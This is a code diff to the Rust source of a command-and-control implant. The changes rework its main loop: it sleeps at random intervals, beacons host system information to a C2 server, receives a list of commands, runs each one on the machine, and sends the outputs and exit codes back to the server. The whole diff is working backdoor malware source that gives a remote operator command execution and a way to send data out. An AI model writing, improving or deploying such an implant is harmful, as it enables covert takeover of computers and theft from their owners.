@@ -1,8 +1,5 @@
 use std::{
-    io::Write,
-    net::TcpStream,
-    process::Command,
-    thread::{self, sleep},
+    io::Write, net::TcpStream, os::unix::process::CommandExt, process::Command, thread::sleep,
     time::Duration,
 };
 
@@ -12,44 +9,43 @@ use common::{IMPLANT_REPORT_RATE_SECONDS, Packet, SystemInfo, encode, read_packe
 use rand::{Rng, rng};
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
-    thread::spawn(move || {
-        loop {
-            connect()
-                .write(
-                    encode(Packet::Beacon {
-                        system_info: SystemInfo::get(),
-                    })
-                    .unwrap()
-                    .as_slice(),
-                )
-                .unwrap();
-
-            sleep(Duration::from_secs(
-                rng().random_range(IMPLANT_REPORT_RATE_SECONDS),
-            ));
-        }
-    });
-
     loop {
+        sleep(Duration::from_secs(
+            rng().random_range(IMPLANT_REPORT_RATE_SECONDS),
+        ));
+
         let mut connection = connect();
+        connection
+            .write(
+                encode(Packet::Beacon {
+                    system_info: SystemInfo::get(),
+                })
+                .unwrap()
+                .as_slice(),
+            )
+            .unwrap();
+
         let packet = read_packet(&mut connection).unwrap();
 
+        drop(connection);
         match packet {
-            Packet::ImplantCommandPacket { command } => {
-                let command = Command::new(command)
-                    .spawn()
-                    .unwrap()
-                    .wait_with_output()
-                    .unwrap();
+            Packet::CommandList { commands } => {
+                let mut results = Vec::new();
+                for command in commands {
+                    println!("({command})");
+                    let command = Command::new(command).output().unwrap();
 
-                connection
+                    println!("{}", String::from_utf8_lossy(command.stdout.as_slice()));
+                    results.push((
+                        String::from_utf8_lossy(command.stdout.as_slice()).into(),
+                        command.status.code().unwrap(),
+                    ));
+                }
+                connect()
                     .write(
-                        encode(Packet::CommandResult {
-                            output: String::from_utf8_lossy(command.stdout.as_slice()).to_string(),
-                            exit_code: command.status.code().unwrap(),
-                        })
-                        .unwrap()
-                        .as_slice(),
+                        encode(Packet::CommandResults { results })
+                            .unwrap()
+                            .as_slice(),
                     )
                     .unwrap();
             }
@@ -65,7 +61,7 @@ fn connect() -> TcpStream {
         if stream.is_err() {
             println!("Failed to estabilish a connection to the C2, retrying in a minute...");
             sleep(Duration::from_secs(if cfg!(debug_assertions) {
-                10
+                1
             } else {
                 60
             }));
